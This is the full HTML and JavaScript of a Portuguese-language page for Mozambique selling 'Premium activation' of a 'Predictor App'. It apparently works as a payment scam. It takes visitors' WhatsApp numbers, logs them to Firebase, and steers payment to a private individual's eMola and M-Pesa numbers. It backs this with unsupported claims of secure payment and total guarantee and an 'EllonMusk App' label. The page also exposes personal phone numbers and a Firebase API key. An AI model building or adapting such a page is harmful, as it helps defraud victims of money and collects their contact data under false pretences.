<!DOCTYPE html>
<html lang="pt">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>üöÄ Predictor App | Ativa√ß√£o Premium via WhatsApp</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  
  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>

  <style>
    :root {
      --primary: #0066FF;
      --primary-dark: #0052D4;
      --secondary: #00D4AA;
      --accent: #FF6B35;
      --success: #00C853;
      --warning: #FFB300;
      --danger: #FF3D00;
      --dark: #121826;
      --light: #FFFFFF;
      --gray-50: #F9FAFB;
      --gray-100: #F3F4F6;
      --gray-200: #E5E7EB;
      --gray-600: #4B5563;
      --gray-800: #1F2937;
      --shadow-sm: 0 1px 3px rgba(0,0,0,0.12);
      --shadow-md: 0 4px 12px rgba(0,0,0,0.15);
      --shadow-lg: 0 10px 25px rgba(0,0,0,0.2);
      --radius-sm: 12px;
      --radius-md: 16px;
      --radius-lg: 20px;
      --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      padding: 16px;
      color: var(--dark);
      line-height: 1.5;
    }

    /* Container */
    .container {
      max-width: 100%;
      background: var(--light);
      border-radius: var(--radius-lg);
      overflow: hidden;
      box-shadow: var(--shadow-lg);
      margin: 0 auto;
    }

    /* Header - Chamativo */
    .header {
      background: linear-gradient(135deg, var(--primary), #7C3AED);
      padding: 28px 24px;
      text-align: center;
      color: white;
      position: relative;
      overflow: hidden;
    }

    .header::before {
      content: '';
      position: absolute;
      top: -50%;
      right: -50%;
      width: 200%;
      height: 200%;
      background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
      background-size: 30px 30px;
      opacity: 0.3;
      animation: float 20s linear infinite;
    }

    @keyframes float {
      0% { transform: translate(0, 0) rotate(0deg); }
      100% { transform: translate(-30px, -30px) rotate(360deg); }
    }

    .logo-container {
      position: relative;
      z-index: 2;
      margin-bottom: 20px;
    }

    .logo {
      font-size: 28px;
      font-weight: 900;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 12px;
      letter-spacing: -0.5px;
    }

    .logo-icon {
      background: rgba(255,255,255,0.2);
      width: 50px;
      height: 50px;
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      backdrop-filter: blur(10px);
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { transform: scale(1); }
      50% { transform: scale(1.05); }
    }

    .badge {
      display: inline-flex;
      align-items: center;
      gap: 8px;
      background: rgba(255,255,255,0.15);
      backdrop-filter: blur(10px);
      padding: 10px 22px;
      border-radius: 50px;
      font-size: 15px;
      font-weight: 700;
      margin-bottom: 16px;
      position: relative;
      z-index: 2;
      border: 1px solid rgba(255,255,255,0.2);
    }

    .header h1 {
      font-size: 28px;
      font-weight: 900;
      margin-bottom: 8px;
      position: relative;
      z-index: 2;
      letter-spacing: -0.5px;
    }

    .subtitle {
      font-size: 16px;
      opacity: 0.95;
      font-weight: 500;
      position: relative;
      z-index: 2;
    }

    /* Price Card - Compacto e Elegante */
    .price-card {
      background: linear-gradient(135deg, var(--secondary), #00B894);
      margin: -20px 24px 24px;
      padding: 22px;
      border-radius: var(--radius-md);
      color: white;
      text-align: center;
      position: relative;
      z-index: 10;
      box-shadow: var(--shadow-md);
      border: 2px solid rgba(255,255,255,0.3);
      backdrop-filter: blur(10px);
    }

    .price-label {
      font-size: 15px;
      font-weight: 600;
      opacity: 0.9;
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .price {
      font-size: 44px;
      font-weight: 900;
      margin-bottom: 4px;
      line-height: 1;
      text-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }

    .price-period {
      font-size: 16px;
      font-weight: 600;
      opacity: 0.9;
    }

    .benefits {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-top: 16px;
      padding-top: 16px;
      border-top: 1px solid rgba(255,255,255,0.2);
    }

    .benefit {
      display: flex;
      align-items: center;
      gap: 6px;
      font-size: 14px;
      opacity: 0.9;
    }

    /* Content */
    .content {
      padding: 0 24px 28px;
    }

    /* WhatsApp Section - Elegante */
    .whatsapp-section {
      background: var(--gray-50);
      padding: 22px;
      border-radius: var(--radius-md);
      margin-bottom: 24px;
      border: 2px solid var(--gray-200);
      position: relative;
    }

    .section-header {
      display: flex;
      align-items: center;
      gap: 12px;
      margin-bottom: 20px;
    }

    .section-icon {
      width: 44px;
      height: 44px;
      background: linear-gradient(135deg, #25D366, #128C7E);
      border-radius: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 20px;
    }

    .section-title {
      font-size: 18px;
      font-weight: 800;
      color: var(--dark);
      flex: 1;
    }

    .form-group {
      margin-bottom: 20px;
    }

    .form-label {
      display: block;
      margin-bottom: 10px;
      font-weight: 700;
      color: var(--gray-800);
      font-size: 15px;
    }

    .input-container {
      position: relative;
    }

    .country-code {
      position: absolute;
      left: 16px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--gray-600);
      font-weight: 600;
      font-size: 17px;
      pointer-events: none;
    }

    .form-input {
      width: 100%;
      padding: 18px 18px 18px 65px;
      border-radius: 12px;
      border: 2px solid var(--gray-200);
      font-size: 17px;
      font-weight: 600;
      transition: var(--transition);
      background: white;
      color: var(--dark);
    }

    .form-input:focus {
      outline: none;
      border-color: var(--primary);
      box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.1);
    }

    .input-hint {
      font-size: 13px;
      color: var(--gray-600);
      margin-top: 8px;
      display: flex;
      align-items: center;
      gap: 6px;
    }

    .status-message {
      padding: 16px;
      border-radius: 12px;
      margin-top: 16px;
      font-weight: 600;
      font-size: 15px;
      display: none;
      animation: slideIn 0.3s ease;
      border-left: 4px solid;
    }

    .status-success {
      background: #E8F5E9;
      color: #2E7D32;
      border-left-color: var(--success);
    }

    .status-error {
      background: #FFEBEE;
      color: #C62828;
      border-left-color: var(--danger);
    }

    /* Warning Box */
    .warning-box {
      background: linear-gradient(135deg, #FFF3CD, #FFEAA7);
      border: 2px solid #FFC107;
      padding: 18px;
      border-radius: var(--radius-sm);
      margin: 20px 0;
      animation: fadeIn 0.5s ease;
    }

    .warning-header {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 10px;
    }

    .warning-icon {
      color: #FF8C00;
      font-size: 20px;
    }

    .warning-title {
      font-size: 16px;
      font-weight: 800;
      color: #E65100;
    }

    .warning-text {
      font-size: 15px;
      color: #BF360C;
      line-height: 1.5;
    }

    .warning-text strong {
      color: #D84315;
      background: #FFECB3;
      padding: 2px 6px;
      border-radius: 4px;
    }

    /* Payment Methods - Compactos e Elegantes */
    .payment-section {
      margin-bottom: 24px;
    }

    .payment-methods {
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .payment-method {
      background: white;
      padding: 20px;
      border-radius: var(--radius-md);
      border: 2px solid var(--gray-200);
      transition: var(--transition);
      position: relative;
    }

    .payment-method.recommended {
      border-color: var(--primary);
      background: linear-gradient(145deg, #F8FAFF, white);
    }

    .method-header {
      display: flex;
      align-items: center;
      gap: 14px;
      margin-bottom: 18px;
    }

    .method-icon {
      width: 52px;
      height: 52px;
      border-radius: 14px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 22px;
      flex-shrink: 0;
    }

    .emola .method-icon {
      background: linear-gradient(135deg, #8B5CF6, #7C3AED);
    }

    .mpesa .method-icon {
      background: linear-gradient(135deg, #10B981, #059669);
    }

    .method-info {
      flex: 1;
    }

    .method-title {
      font-size: 18px;
      font-weight: 800;
      color: var(--dark);
      margin-bottom: 4px;
    }

    .method-subtitle {
      font-size: 14px;
      color: var(--gray-600);
      font-weight: 500;
    }

    .method-details {
      background: var(--gray-50);
      padding: 16px;
      border-radius: 10px;
      margin-bottom: 18px;
      border: 1px solid var(--gray-200);
    }

    .detail-item {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 0;
      border-bottom: 1px solid var(--gray-200);
    }

    .detail-item:last-child {
      border-bottom: none;
      padding-top: 12px;
      margin-top: 4px;
    }

    .detail-label {
      font-size: 15px;
      color: var(--gray-800);
      font-weight: 600;
    }

    .detail-value {
      font-size: 20px;
      font-weight: 900;
      color: var(--primary);
      font-family: 'Courier New', monospace;
      letter-spacing: 0.5px;
    }

    .account-holder {
      font-size: 16px;
      font-weight: 700;
      color: var(--dark);
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .copy-button {
      width: 100%;
      padding: 16px;
      border-radius: 12px;
      border: none;
      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
      color: white;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: var(--transition);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .copy-button:disabled {
      background: var(--gray-200);
      color: var(--gray-600);
      cursor: not-allowed;
      opacity: 0.7;
    }

    .copy-button:not(:disabled):hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 15px rgba(0, 102, 255, 0.3);
    }

    .copy-button.copied {
      background: linear-gradient(135deg, var(--success), #00B894);
    }

    /* Support Section - Elegante */
    .support-section {
      background: linear-gradient(135deg, var(--dark), #1E293B);
      color: white;
      padding: 24px;
      border-radius: var(--radius-md);
      text-align: center;
      margin-top: 24px;
      position: relative;
      overflow: hidden;
    }

    .support-section::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      right: 0;
      height: 3px;
      background: linear-gradient(90deg, var(--primary), var(--accent));
    }

    .support-title {
      font-size: 18px;
      font-weight: 700;
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .support-desc {
      font-size: 15px;
      color: #CBD5E1;
      margin-bottom: 20px;
      line-height: 1.6;
    }

    .support-number {
      font-size: 24px;
      font-weight: 900;
      color: #38BDF8;
      margin: 12px 0;
      direction: ltr;
      letter-spacing: 0.5px;
    }

    .support-button {
      display: inline-flex;
      align-items: center;
      gap: 10px;
      background: rgba(56, 189, 248, 0.15);
      color: #38BDF8;
      padding: 14px 24px;
      border-radius: 12px;
      font-weight: 700;
      text-decoration: none;
      font-size: 15px;
      border: 2px solid rgba(56, 189, 248, 0.25);
      transition: var(--transition);
      margin-top: 8px;
    }

    .support-button:hover {
      background: rgba(56, 189, 248, 0.25);
      transform: translateY(-2px);
    }

    .support-hours {
      font-size: 14px;
      color: #94A3B8;
      margin-top: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    /* Footer */
    .footer {
      padding: 24px;
      text-align: center;
      background: var(--gray-50);
      border-top: 2px solid var(--gray-200);
    }

    .security-grid {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-bottom: 20px;
    }

    .security-item {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 8px;
      padding: 12px;
      background: white;
      border-radius: 10px;
      border: 1px solid var(--gray-200);
    }

    .security-icon {
      font-size: 20px;
    }

    .security-text {
      font-size: 12px;
      font-weight: 600;
      color: var(--gray-800);
      text-align: center;
      line-height: 1.3;
    }

    .copyright {
      font-size: 13px;
      color: var(--gray-600);
      margin-top: 12px;
      font-weight: 500;
    }

    /* Toast */
    .toast {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: white;
      color: var(--dark);
      padding: 16px 20px;
      border-radius: 12px;
      font-weight: 700;
      display: none;
      z-index: 1000;
      box-shadow: var(--shadow-lg);
      border-left: 4px solid;
      max-width: 90%;
      text-align: center;
      animation: slideDown 0.3s ease;
    }

    /* Animations */
    @keyframes slideIn {
      from { opacity: 0; transform: translateY(-10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    @keyframes slideDown {
      from { opacity: 0; transform: translate(-50%, -20px); }
      to { opacity: 1; transform: translate(-50%, 0); }
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }

    /* Spinner */
    .spinner {
      display: inline-block;
      width: 20px;
      height: 20px;
      border: 3px solid rgba(255,255,255,0.3);
      border-radius: 50%;
      border-top-color: white;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Responsive */
    @media (min-width: 480px) {
      .container {
        max-width: 420px;
        margin: 20px auto;
      }
    }

    /* Utility */
    .hidden {
      display: none !important;
    }

    .shake {
      animation: shake 0.5s ease-in-out;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-5px); }
      75% { transform: translateX(5px); }
    }
  </style>
</head>

<body>

<!-- Toast -->
<div class="toast" id="toast">
  <div style="display: flex; align-items: center; gap: 10px;">
    <i class="fas fa-check-circle" id="toastIcon"></i>
    <span id="toastMessage">Copiado com sucesso!</span>
  </div>
</div>

<div class="container">

  <!-- Header -->
  <div class="header">
    <div class="logo-container">
      <div class="logo">
        <div class="logo-icon">
          <i class="fas fa-bolt"></i>
        </div>
        <span>VOUCHER-PAY</span>
      </div>
    </div>
    
    <div class="badge">
      <i class="fas fa-shield-alt"></i>
      PAGAMENTO 100% SEGURO
    </div>
    
    <h1>ATIVA√á√ÉO PREMIUM</h1>
    <p class="subtitle">Receba o seu c√≥digo via WhatsApp</p>
  </div>

  <!-- Price Card -->
  <div class="price-card">
    <div class="price-label">Valor Total</div>
    <div class="price">659 MT</div>
    <div class="price-period">Acesso por 2Dias</div>
    
    <div class="benefits">
      <div class="benefit">
        <i class="fas fa-check"></i>
        <span>Acesso Imediato</span>
      </div>
      <div class="benefit">
        <i class="fas fa-headset"></i>
        <span>Suporte 24/7</span>
      </div>
    </div>
  </div>

  <!-- Content -->
  <div class="content">

    <!-- WhatsApp Section -->
    <div class="whatsapp-section">
      <div class="section-header">
        <div class="section-icon">
          <i class="fab fa-whatsapp"></i>
        </div>
        <div class="section-title">Digite seu WhatsApp</div>
      </div>
      
      <div class="form-group">
        <label class="form-label">N√∫mero para receber o c√≥digo Voucher:</label>
        <div class="input-container">
          <span class="country-code">+258</span>
          <input type="tel" 
                 id="whatsapp" 
                 class="form-input" 
                 placeholder="84 123 456" 
                 maxlength="13"
                 inputmode="numeric"
                 autocomplete="tel"
                 required>
        </div>
        <div class="input-hint">
          <i class="fas fa-info-circle"></i>
          Digite 9 d√≠gitos (ex: 84xxxxxxx)
        </div>
      </div>
      
      <!-- Status Messages -->
      <div class="status-message status-success" id="successMessage">
        <i class="fas fa-check-circle"></i>
        WhatsApp registrado! Pronto para pagamento.
      </div>
      
      <div class="status-message status-error" id="errorMessage">
        <i class="fas fa-exclamation-circle"></i>
        <span id="errorText">Digite 9 d√≠gitos v√°lidos</span>
      </div>
    </div>

    <!-- Warning Box -->
    <div class="warning-box">
      <div class="warning-header">
        <i class="fas fa-exclamation-triangle warning-icon"></i>
        <div class="warning-title">INSTRU√á√ÉO IMPORTANTE</div>
      </div>
      <div class="warning-text">
        Ao fazer o pagamento, <strong>CONFIRME O NOME: LUCAS JOS√â</strong> para Verifica√ß√£o. 
        O c√≥digo Voucher ser√° enviado em menos de 5Min ap√≥s o pagamento confirmado.
      </div>
    </div>

    <!-- Payment Methods -->
    <div class="payment-section">
      <div class="section-header">
        <div class="section-icon" style="background: linear-gradient(135deg, var(--primary), #4F46E5);">
          <i class="fas fa-credit-card"></i>
        </div>
        <div class="section-title">M√©todo de Pagamento</div>
      </div>
      
      <div class="payment-methods">
        
        <!-- eMola -->
        <div class="payment-method emola recommended">
          <div class="method-header">
            <div class="method-icon">
              <i class="fas fa-wallet"></i>
            </div>
            <div class="method-info">
              <div class="method-title">eMOLA</div>
              <div class="method-subtitle">Mais usado ‚Ä¢ Recomendado</div>
            </div>
          </div>
          
          <div class="method-details">
            <div class="detail-item">
              <span class="detail-label">N√∫mero:</span>
              <span class="detail-value">866890298</span>
            </div>
            <div class="detail-item">
              <span class="account-holder">
                <i class="fas fa-user-check"></i>
                Titular: <span style="color: var(--primary);">LUCAS JOS√â</span>
              </span>
            </div>
          </div>
          
          <button class="copy-button" id="emolaBtn" onclick="copyNumber('866890298', this, 'eMola')" disabled>
            <span class="btn-text">COPIAR N√öMERO</span>
            <span class="spinner hidden"></span>
          </button>
        </div>

        <!-- M-Pesa -->
        <div class="payment-method mpesa">
          <div class="method-header">
            <div class="method-icon">
              <i class="fas fa-money-bill-wave"></i>
            </div>
            <div class="method-info">
              <div class="method-title">M-PESA</div>
              <div class="method-subtitle">Alternativa ‚Ä¢ Seguro</div>
            </div>
          </div>
          
          <div class="method-details">
            <div class="detail-item">
              <span class="detail-label">N√∫mero:</span>
              <span class="detail-value">848750886</span>
            </div>
            <div class="detail-item">
              <span class="account-holder">
                <i class="fas fa-user-check"></i>
                Titular: <span style="color: var(--primary);">LUCAS JOS√â</span>
              </span>
            </div>
          </div>
          
          <button class="copy-button" id="mpesaBtn" onclick="copyNumber('848750886', this, 'M-Pesa')" disabled>
            <span class="btn-text">COPIAR N√öMERO</span>
            <span class="spinner hidden"></span>
          </button>
        </div>
      </div>
    </div>

    <!-- Support Section -->
    <div class="support-section">
      <div class="support-title">
        <i class="fas fa-headset"></i>
        PRECISA DE AJUDA?
      </div>
      <div class="support-desc">
        Problemas com pagamento ou n√£o recebeu o c√≥digo? 
        Fale diretamente com nosso suporte.
      </div>
      <div class="support-number">+258 866 890 298</div>
      <button class="support-button" onclick="copySupportNumber()">
        <i class="fas fa-copy"></i>
        COPIAR N√öMERO DO SUPORTE
      </button>
      <div class="support-hours">
        <i class="far fa-clock"></i>
        Atendimento: 8h √†s 22h
      </div>
    </div>
  </div>

  <!-- Footer -->
  <div class="footer">
    <div class="security-grid">
      <div class="security-item">
        <i class="fas fa-lock security-icon" style="color: var(--success);"></i>
        <div class="security-text">Pagamento Seguro</div>
      </div>
      <div class="security-item">
        <i class="fas fa-bolt security-icon" style="color: var(--warning);"></i>
        <div class="security-text">Entrega Instant√¢nea</div>
      </div>
      <div class="security-item">
        <i class="fas fa-shield-alt security-icon" style="color: var(--primary);"></i>
        <div class="security-text">Garantia Total</div>
      </div>
    </div>
    <div class="copyright">
      ¬© 2025 EllonMusk App ‚Ä¢
    </div>
  </div>
</div>

<script>
  // ==================== CONFIGURA√á√ÉO DO FIREBASE ====================
  const firebaseConfig = {
    apiKey: "AIzaSyDbPB6XBF3J1VY0X0ZQj2SKu8",
    authDomain: "whatsapp-24492.firebaseapp.com",
    projectId: "whatsapp-24492",
    storageBucket: "whatsapp-24492.appspot.com",
    messagingSenderId: "5299709394245",
    appId: "1:5299709394245:web:7d46554&c2e",
    measurementId: "G-FAKLLOK27H"
  };

  // Inicializar Firebase
  try {
    if (!firebase.apps.length) {
      firebase.initializeApp(firebaseConfig);
      console.log("‚úÖ Firebase inicializado!");
    }
  } catch (error) {
    console.error("‚ùå Erro Firebase:", error);
  }

  const db = firebase.firestore();
  
  // ==================== VARI√ÅVEIS GLOBAIS ====================
  const whatsappInput = document.getElementById('whatsapp');
  const successMessage = document.getElementById('successMessage');
  const errorMessage = document.getElementById('errorMessage');
  const errorText = document.getElementById('errorText');
  const toast = document.getElementById('toast');
  const toastMessage = document.getElementById('toastMessage');
  const toastIcon = document.getElementById('toastIcon');
  const emolaBtn = document.getElementById('emolaBtn');
  const mpesaBtn = document.getElementById('mpesaBtn');
  
  let isWhatsappValid = false;
  let currentWhatsappNumber = '';

  // ==================== INICIALIZA√á√ÉO ====================
  document.addEventListener('DOMContentLoaded', function() {
    // Carregar n√∫mero salvo
    const saved = localStorage.getItem('predictor_whatsapp_mobile');
    if (saved) {
      whatsappInput.value = formatPhoneNumber(saved);
      validateWhatsappNumber();
    }
    
    // Configurar valida√ß√£o em tempo real
    whatsappInput.addEventListener('input', function() {
      let value = this.value.replace(/\D/g, '');
      
      if (value.length > 9) {
        value = value.substring(0, 9);
      }
      
      this.value = formatPhoneNumber(value);
      validateWhatsappNumber();
    });
    
    // Validar ao perder foco
    whatsappInput.addEventListener('blur', function() {
      validateWhatsappNumber(true);
    });
    
    // Focar no campo
    setTimeout(() => whatsappInput.focus(), 400);
    
    console.log("üöÄ Predictor Mobile Premium carregado!");
  });

  // ==================== FORMATAR N√öMERO ====================
  function formatPhoneNumber(number) {
    if (!number) return '';
    const cleaned = number.replace(/\D/g, '');
    const match = cleaned.match(/^(\d{2})(\d{3})(\d{0,4})$/);
    if (match) {
      return match[1] + ' ' + match[2] + (match[3] ? ' ' + match[3] : '');
    }
    return cleaned;
  }

  // ==================== VALIDAR WHATSAPP ====================
  function validateWhatsappNumber(saveToFirebase = false) {
    const rawNumber = whatsappInput.value.replace(/\s/g, '');
    
    // Resetar mensagens
    successMessage.style.display = 'none';
    errorMessage.style.display = 'none';
    
    // Verificar se est√° vazio
    if (!rawNumber) {
      isWhatsappValid = false;
      updateCopyButtons();
      return false;
    }
    
    // Verificar se tem 9 d√≠gitos
    if (rawNumber.length !== 9) {
      showError('Digite exatamente 9 d√≠gitos');
      isWhatsappValid = false;
      updateCopyButtons();
      return false;
    }
    
    // Verificar prefixo v√°lido
    const validPrefixes = ['82', '83', '84', '85', '86', '87'];
    const prefix = rawNumber.substring(0, 2);
    if (!validPrefixes.includes(prefix)) {
      showError('Use prefixo 82, 83, 84, 85, 86 ou 87');
      isWhatsappValid = false;
      updateCopyButtons();
      return false;
    }
    
    // N√∫mero v√°lido
    currentWhatsappNumber = rawNumber;
    isWhatsappValid = true;
    
    // Salvar no localStorage
    localStorage.setItem('predictor_whatsapp_mobile', rawNumber);
    
    // Atualizar bot√µes
    updateCopyButtons();
    
    // Mostrar sucesso
    successMessage.style.display = 'block';
    
    // Salvar no Firebase
    if (saveToFirebase) {
      saveToFirebaseDB(rawNumber);
    }
    
    return true;
  }

  // ==================== ATUALIZAR BOT√ïES ====================
  function updateCopyButtons() {
    if (isWhatsappValid) {
      emolaBtn.disabled = false;
      mpesaBtn.disabled = false;
    } else {
      emolaBtn.disabled = true;
      mpesaBtn.disabled = true;
    }
  }

  // ==================== MOSTRAR ERRO ====================
  function showError(message) {
    errorText.textContent = message;
    errorMessage.style.display = 'block';
    successMessage.style.display = 'none';
    
    // Anima√ß√£o de shake
    whatsappInput.classList.add('shake');
    setTimeout(() => {
      whatsappInput.classList.remove('shake');
    }, 500);
  }

  // ==================== SALVAR NO FIREBASE ====================
  async function saveToFirebaseDB(phoneNumber) {
    try {
      await db.collection('whatsapp_numbers').add({
        phoneNumber: phoneNumber,
        status: 'pending',
        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
        amount: '659 MT',
        page: 'predictor_mobile_premium',
        userAgent: navigator.userAgent
      });
      console.log('‚úÖ N√∫mero salvo no Firebase');
      return true;
    } catch (error) {
      console.error('‚ùå Erro Firebase:', error);
      return false;
    }
  }

  // ==================== FUN√á√ÉO DE C√ìPIA ====================
  async function copyNumber(number, button, method) {
    // Verificar WhatsApp
    if (!isWhatsappValid) {
      showToast('Digite seu WhatsApp primeiro!', 'error');
      whatsappInput.focus();
      return;
    }
    
    const btnText = button.querySelector('.btn-text');
    const spinner = button.querySelector('.spinner');
    const originalText = btnText.textContent;
    
    btnText.textContent = 'COPIANDO...';
    spinner.classList.remove('hidden');
    button.disabled = true;
    
    try {
      await navigator.clipboard.writeText(number);
      
      // Registrar a√ß√£o
      await logCopyAction(number, method);
      
      // Mostrar toast
      showToast(`‚úÖ ${method} copiado! Nome: LUCAS JOS√â`, 'success');
      
      // Atualizar bot√£o
      btnText.textContent = 'COPIADO!';
      button.classList.add('copied');
      spinner.classList.add('hidden');
      
      // Restaurar ap√≥s 1.5s
      setTimeout(() => {
        btnText.textContent = originalText;
        button.classList.remove('copied');
        button.disabled = false;
      }, 1500);
      
    } catch (error) {
      console.error('Erro ao copiar:', error);
      
      showToast('‚ùå Erro ao copiar', 'error');
      
      btnText.textContent = originalText;
      spinner.classList.add('hidden');
      button.disabled = false;
    }
  }

  // ==================== COPIAR N√öMERO DO SUPORTE ====================
  async function copySupportNumber() {
    const supportNumber = '+258866890298';
    
    try {
      await navigator.clipboard.writeText(supportNumber);
      showToast('‚úÖ N√∫mero do suporte copiado!', 'success');
      
      // Registrar a√ß√£o
      try {
        await db.collection('support_copies').add({
          timestamp: firebase.firestore.FieldValue.serverTimestamp(),
          userAgent: navigator.userAgent,
          whatsappNumber: currentWhatsappNumber || 'not_provided'
        });
      } catch (e) {
        console.error('Erro ao registrar c√≥pia do suporte:', e);
      }
      
    } catch (error) {
      console.error('Erro ao copiar suporte:', error);
      showToast('‚ùå Erro ao copiar', 'error');
    }
  }

  // ==================== REGISTRAR A√á√ÉO ====================
  async function logCopyAction(number, method) {
    try {
      await db.collection('copy_actions').add({
        whatsappNumber: currentWhatsappNumber,
        copiedNumber: number,
        method: method,
        accountHolder: 'LUCAS JOS√â',
        timestamp: firebase.firestore.FieldValue.serverTimestamp()
      });
    } catch (error) {
      console.error('Erro ao registrar c√≥pia:', error);
    }
  }

  // ==================== MOSTRAR TOAST ====================
  function showToast(message, type = 'success') {
    toastMessage.textContent = message;
    
    if (type === 'success') {
      toastIcon.className = 'fas fa-check-circle';
      toast.style.borderLeftColor = 'var(--success)';
      toastIcon.style.color = 'var(--success)';
    } else if (type === 'error') {
      toastIcon.className = 'fas fa-exclamation-circle';
      toast.style.borderLeftColor = 'var(--danger)';
      toastIcon.style.color = 'var(--danger)';
    } else if (type === 'warning') {
      toastIcon.className = 'fas fa-exclamation-triangle';
      toast.style.borderLeftColor = 'var(--warning)';
      toastIcon.style.color = 'var(--warning)';
    }
    
    toast.style.display = 'block';
    
    // Esconder ap√≥s 3.5s
    setTimeout(() => {
      toast.style.display = 'none';
    }, 3500);
  }

  // ==================== AUTO-SAVE ====================
  setInterval(() => {
    if (isWhatsappValid) {
      localStorage.setItem('predictor_whatsapp_mobile', currentWhatsappNumber);
    }
  }, 30000);

  // ==================== PREVENIR ENVIO DE FORMUL√ÅRIO ====================
  document.addEventListener('submit', function(e) {
    e.preventDefault();
    return false;
  });

</script>

</body>
</html>